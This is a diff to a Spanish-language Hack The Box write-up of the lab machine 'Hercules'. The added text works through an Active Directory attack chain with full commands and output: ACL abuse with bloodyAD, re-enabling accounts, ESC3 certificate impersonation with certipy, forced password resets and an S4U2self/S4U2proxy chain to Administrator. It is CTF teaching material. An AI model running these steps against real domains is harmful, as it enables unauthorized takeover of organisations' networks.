@@ -1824,7 +1824,7 @@ PS C:\Users\auditor\Desktop> type user.txt
 <h2 id="FMigration">Asignando Dueño y Permiso GenericAll a Usuario Auditor sobre OU Forest Migration para Tener su Control Total</h2>
 
 Veamos a qué grupos pertenece este usuario:
-```bash
+```batch
 PS C:\Users\auditor\Desktop> whoami /groups
 
 GROUP INFORMATION
@@ -1866,7 +1866,7 @@ Estos dos tienen una relación operativa, donde el grupo **Forest Management** s
 Podemos revisar que **ACLs** tiene el **OU Forest Migration** sobre el grupo **Forest Management**.
 
 Para esto, cargamos el módulo **ActiveDirectory** y ejecutamos el siguiente comando:
-```bash
+```batch
 PS C:\Users\auditor\Desktop> Import-Module ActiveDirectory
 PS C:\Users\auditor\Desktop> (Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *
 
@@ -1928,7 +1928,7 @@ Listo, con esto ya tenemos control total de este **OU**.
 <h2 id="Fernando">Rehabilitando Cuenta Deshabilitada de Usuario Fernando.R</h2>
 
 Podemos investigar que usuarios regulares existen en este **OU**:
-```bash
+```batch
 PS C:\Users\auditor\Desktop> Get-ADUser -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Filter * -Properties adminCount,UserAccountControl |
   Where-Object { ($_.adminCount -ne 1) -or ($_.adminCount -eq $null) } |
   Select-Object SamAccountName,DistinguishedName,adminCount,UserAccountControl
@@ -1943,7 +1943,7 @@ fernando.r     CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercul
 Todos estos usuarios están deshabilitados.
 
 Pero uno de estos nos puede llamar la atención, siendo el **usuario fernando.r**:
-```bash
+```batch
 PS C:\Users\auditor\Desktop> Get-ADUser -Identity "Fernando.R"
 
 DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
@@ -1982,9 +1982,8 @@ KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d 'hercules.htb' -u '
 Ya esta habilitado.
 
 Lo podemos comprobar revisando su descripción de nuevo:
-```bash
+```batch
 PS C:\Users\auditor\Desktop> Get-ADUser -Identity "Fernando.R"
-
 
 DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
 Enabled           : True
@@ -2192,21 +2191,39 @@ Certificate Templates
 Es un resultado bastante largo, pero es necesario para que lo pueda explicar.
 
 En resumen:
-* 
-* 
-* 
-* 
+* Se encontro solo 1 **CA** siendo el `CA-HERCULES` dentro del **dc.hercules.htb**:
+	* **Web Enrollment (HTTP/HTTPS)** está **Disabled** para esa **CA**, osea que no podremos usar la interfaz web para pedir certificados.
+* Obtuvimos los permisos de la CA: 
+	* **Enroll** en la **CA** aparece como `HERCULES.HTB\Authenticated Users`. Eso indica que cualquier usuario autenticado puede pedir certificados a la **CA** en algún flujo (pero plantillas individuales controlan qué se puede emitir).
+	* **ManageCa / ManageCertificates** están limitados a administradores (Administrators, Domain Admins, Enterprise Admins).
 
+* Plantillas detectadas: 
+	* Encontró 34 templates, de las cuales 18 están habilitadas.
+	* Para cada template Certipy lista flags relevantes, como: **MachineEnrollmentAgent**, **Enrollment Agent (True)**, **Enrolment Supplies (False)** y **Enrolment Rights** (**Smartcard Operators, Domain Admins, Enterprise Admins**).
+	* Se detecto una vulnerabilidad: **VULNERABILITY**: **ESC3** : `Template has Certificate Request Agent EKU set`.
 
+* Vulnerabilidades:
+	* **ESC3 template** tiene **Certificate Request Agent EKU**.
+	* **ESC15 Enrollee supplies subject and schema version is 1** (**Certipy** advierte que **ESC15** solo aplica si el entorno no ha sido parcheado, aplicable el **CVE-2024-49019**.
+	* **User Enrollable Principals** incluye **Smartcard Operators**: usuarios en ese grupo pueden solicitar/autoenrolar esta plantilla.
+
+En general, la vulnerabilidad que vemos es **ESC3 Certificate Attack**.
+
+La idea es abuscar el usuario **fernando.r** para suplantarlo y crear certificados válidos que nos permitan convertirnos en otro usuario, siendo el **usuario ashley.b** nuestro siguiente objetivo.
+
+Esto porque dicho usuario puede conectarse también vía **WinRM**, por lo que igual debe tener ciertos privilegios.
+
+Para poder aplicarlo, usaremos la herramienta **certipy-ad**.
+
+Puede que el ataque falle si es que no estamos en el mismo horario que la máquina **AD**, por lo que usaremos el comando **ntpdate** para ponernos en el mismo horario:
 ```bash
 ntpdate -u dc.hercules.htb
 2025-10-25 00:46:46.117561 (-0600) -0.009117 +/- 0.044474 dc.hercules.htb 10.10.11.91 s1 no-leap
 ```
 
+Ejecuta el ataque:
 ```bash
-KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass \
-  -dc-host dc.hercules.htb -dc-ip 10.10.11.91 -target "dc.hercules.htb" -ca 'CA-HERCULES' \
-  -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
+KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.10.11.91 -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -2217,12 +2234,11 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'fernando.r.pfx'
 [*] Wrote certificate and private key to 'fernando.r.pfx'
 ```
+Con este certificado, estamos suplantando al **usuario fernando.r**.
 
+Ahora como este usuario, crearemos un nuevo certificado para suplantar al **usuario ashley.b**:
 ```bash
-KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass \
-  -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target "dc.hercules.htb" \
-  -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx \
-  -on-behalf-of "HERCULES\\ashley.b" -dcom
+KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx -on-behalf-of "HERCULES\\ashley.b" -dcom
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via DCOM
@@ -2233,7 +2249,13 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'ashley.b.pfx'
 [*] Wrote certificate and private key to 'ashley.b.pfx'
 ```
+Ya estamos suplantando al **usuario ashley.b**.
 
+<br>
+
+<h3 id="MovLateral">Aplicando un Movimiento Lateral para Autenticarnos como Usuario ashley.b</h3>
+
+Podemos utilizar este certificado para autenticarnos al **AD** y nos otorgue el **Hash NT** válido para el **usuario ashley.b**:
 ```bash
 certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -2249,7 +2271,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'ashley.b'
 [*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
 ```
+Tenemos el Hash.
 
+Creamos el **TGT** del **usuario ashley.b**:
 ```bash
 impacket-getTGT -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b@dc.hercules.htb
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -2257,79 +2281,246 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in ashley.b@dc.hercules.htb.ccache
 ```
 
-```bash
+Nos conectamos a la máquina usando la herramienta **winrmexe**:
+```batch
 KRB5CCNAME=ashley.b@dc.hercules.htb.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
 ...
 PS C:\Users\ashley.b\Documents> whoami
 hercules\ashley.b
 ```
+Estamos dentro.
 
+Si nos movemos un poco, encontraremos un script de **PowerShell**:
 ```bash
+PS C:\Users\ashley.b\Documents> cd ../Desktop
+PS C:\Users\ashley.b\Desktop> dir
 
+
+    Directory: C:\Users\ashley.b\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+d-----         12/4/2024  11:45 AM                Mail                                                                  
+-a----         12/4/2024  11:45 AM            102 aCleanup.ps1
 ```
 
+Este script parece que esta hecho para resetear contraseñas, por lo que nos puede ser útil para más adelante:
+```bash
+PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
+Start-ScheduledTask -TaskName "Password Cleanup"
+```
+
+Llegados a este punto, ¿Por que suplantamos al **usuario ashley.b**?
+
+Resulta que este usuario pertenece al grupo **IT Support**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura41.png">
+</p>
+
+Si revisamos la descripción de este grupo, vemos que se menciona como **Password Support**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura42.png">
+</p>
+
+Normalmente, esta clase de descripciones estan relacionadas con la administración de contraseñas dentro del dominio.
+
+Entonces, es buena idea que podamos asignarle más permisos a este grupo, pues nos puede servir para más adelante.
+
+Le asignamos el permiso **GenericAll** al grupo **IT Support**:
+```bash
+KRB5CCNAME=Auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
+[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+```
+
+Y de paso, le damos el permiso **GenericAll** al **usuario auditor**:
+```bash
+KRB5CCNAME=Auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
+[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
+```
+Esto último es para tener el control administrativo de todo el **OU**.
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="IIS_Support">Rehabilitando Usuario IIS_Administrator para Modificar Contraseña de Usuario IIS_webserver</h2>
 
-```bash
+Investigando un poco más con **BloodHound**, encontramos el grupo **Service Operators**, que no pudimos identificar sus usuarios:
 
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura43.png">
+</p>
+
+Ya que tenemos una sesión activa, tanto como **auditor** como con **ashley.b**, podemos investigar que usuarios pertenecen a este grupo:
+```batch
+PS C:\Users\auditor\Documents> Get-ADGroupMember -Identity "Service Operators" -Recursive | Where {$_.objectClass -eq 'user'} | Select Name, SamAccountName, DistinguishedName
+
+Name              SamAccountName    DistinguishedName                                                        
+----              --------------    -----------------                                                        
+IIS_Administrator iis_administrator CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+```
+Tenemos a un usuario llamado **iis_administrator**.
+
+Pero resulta que esta deshabilitado:
+```batch
+PS C:\Users\auditor\Documents> Get-ADUser -Identity "IIS_administrator"
+
+DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+Enabled           : False
+GivenName         : IIS_Administrator
+Name              : IIS_Administrator
+ObjectClass       : user
+ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
+SamAccountName    : iis_administrator
+SID               : S-1-5-21-1889966460-2597381952-958560702-1119
+Surname           : 
+UserPrincipalName : iis_administrator@hercules.htb
 ```
 
-```bash
+Este usuario se ha vuelto ahora nuestra prioridad, pues si revisamos que es lo que puede hacer el grupo **Service Operators**, es que puede cambiar la contraseña del **usuario IIS_weberver**:
 
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura44.png">
+</p>
+
+Resulta que el **usuario IIS_weberver**, tiene un permiso especial y peligroso si logramos suplantarlo:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura45.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura46.png">
+</p>
+
+En resumen, podemos aplicar el ataque **S4U2self/S4U2proxy Abuse Chain**, si es que logramos suplantar al **usuario IIS_webserver**.
+
+Este ataque lo explicaremos más adelante.
+
+Primero, habilitemos al **usuario IIS_administrator**: 
+```bash
+KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
+```
+Ya esta habilitado, puedes comprobarlo.
+
+Podemos cambiarle la contraseña usando nuestro **usuario auditor**, pero para esto ejecutaremos el script **aCleanup.ps1**, pues nos permitira resetear cualquier contraseña sin conflictos.
+
+Aunque puede que elimine los permisos **GenercAll** del grupo **IT Support** y del **usuario auditor**, por lo que después de ejecutarlo, puedes volver a asignarle esos permisos solo para estar seguros de que no se hayan eliminado:
+```batch
+PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
 ```
 
+Ahora sí, cambiemos la contraseña del usuario **IIS_administrator**:
 ```bash
-
+KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k set password "IIS_Administrator" "Passw0rd@123"
+[+] Password changed successfully!
 ```
 
+Vamos a crearle un **TGT** de una vez:
 ```bash
+impacket-getTGT hercules.htb/'iis_administrator':'Passw0rd@123' -dc-ip 10.10.11.91
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Saving ticket in iis_administrator.ccache
+```
+
+Ya con el **TGT**, podemos cambiarle la contraseña al **usuario IIS_webserver** usando **bloodyAD**:
+```bash
+KRB5CCNAME=iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k set password "iis_webserver$" Passw0rd@123
+[+] Password changed successfully!
+```
+
+Podemos convertir esa contraseña en un **Hash NT**:
+```bash
+iconv -f ASCII -t UTF-16LE <(printf 'Passw0rd@123') | openssl dgst -md4
+MD4(stdin)= 14d0fcda7ad363097760391f302da68d
+```
+
+Y usamos ese **Hash NT** para crear un **TGT** valido del **usuario IIS_webserver** con tal de suplantarlo:
+```bash
+impacket-getTGT -hashes :14d0fcda7ad363097760391f302da68d 'hercules.htb/IIS_webserver$' -dc-ip 10.10.11.91
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in IIS_webserver$.ccache
 ```
 
 <br>
 
-<h2 id=""></h2>
+<h2 id="AbuseChaing">Aplicando el Ataque S4U2self/S4U2proxy Abuse Chain para Escalar Privilegios</h2>
 
-```bash
+¿Qué es el ataque **S4U2self/S4U2proxy Abuse Chain**?
 
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
-```bash
-
-```
-
+| **S4U2self/S4U2proxy Abuse Chain** |
+|:----------------------------------:|
+| *Es cuando un atacante abusa de una configuración legítima de delegación Kerberos para impersonar a otros usuarios (incluso admins) sin tener sus credenciales. Si una cuenta de servicio o máquina tiene delegación (por ejemplo, “constrained delegation”), puedes encadenar S4U2self → S4U2proxy para obtener tickets de servicio como otro usuario (hasta Domain Admin).* |
 
 <br>
 
-<h2 id=""></h2>
+Te dejo aquí unos blogs que explican este ataque y muestran ejemplos practicos:
+* <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse" target="_blank">S4U2self abuse</a>
+* <a href="https://www.blackhillsinfosec.com/abusing-s4u2self-for-active-directory-pivoting/" target="_blank">Abusing S4U2Self for Active Directory Pivoting</a>
+* <a href="https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c" target="_blank">S4U2Pwnage</a>
 
+Para aplicar el ataque, necesitamos el **Session Key Hash** del **TGT** del **usuario IIS_webserver$**:
 ```bash
-
+impacket-describeTicket 'IIS_webserver$.ccache' | grep 'Ticket Session Key'
+[*] Ticket Session Key            : 0d065e8e9e6fc09f7a8483a77f1c1be3
 ```
 
+Utilizando este Hash, podemos cambiarle la contraseña al **usuario IIS_webserver$**:
 ```bash
+impacket-changepasswd -newhashes :0d065e8e9e6fc09f7a8483a77f1c1be3 'hercules.htb'/'IIS_webserver$':'Passw0rd@123'@'dc.hercules.htb' -k
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Changing the password of hercules.htb\IIS_webserver$
+[*] Connecting to DCE/RPC as hercules.htb\IIS_webserver$
+[-] CCache file is not found. Skipping...
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
 ```
+Funcionó.
 
+Ahora, para aplicar el ataque utilizaremos la herramienta **impacket-getST** y le indicamos que queremos suplantar al **usuario Administrator**:
 ```bash
+KRB5CCNAME=IIS_webserver$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
 ```
+Excelente, nos genero un **archivo ccache**, siendo un **TGS**.
 
-```bash
-
+Utilicemos este **TGS** para autenticarnos en el **AD** como el **usuario Administrator**:
+```batch
+KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
+...
+PS C:\Users\Administrator\Documents> whoami
+hercules\administrator
 ```
+Estamos dentro y tenemos maximos privilegios.
 
+Busquemos la última flag:
+```batch
+PS C:\Users\Administrator\Desktop> cd ../../Admin/Desktop
+PS C:\Users\Admin\Desktop> dir
+
+
+    Directory: C:\Users\Admin\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+-ar---        10/25/2025  10:54 AM             34 root.txt                                                              
+
+
+PS C:\Users\Admin\Desktop> type root.txt
+...
+```
+Y con esto terminamos la máquina.
 
 
 <br>
@@ -2354,8 +2545,13 @@ hercules\ashley.b
 * https://github.com/SorceryIE/aspxauth_cookie_forger/blob/main/Program.cs
 * https://gist.github.com/dazinator/0cdb8e1fbf81d3ed5d44
 * https://github.com/lof1sec/Bad-ODF
-* 
-* 
+* https://www.hackingarticles.in/shadow-credentials-attack/
+* https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204
+* https://github.com/ozelis/winrmexec
+* https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse
+* https://www.blackhillsinfosec.com/abusing-s4u2self-for-active-directory-pivoting/
+* https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c
+
 
 <br>
 
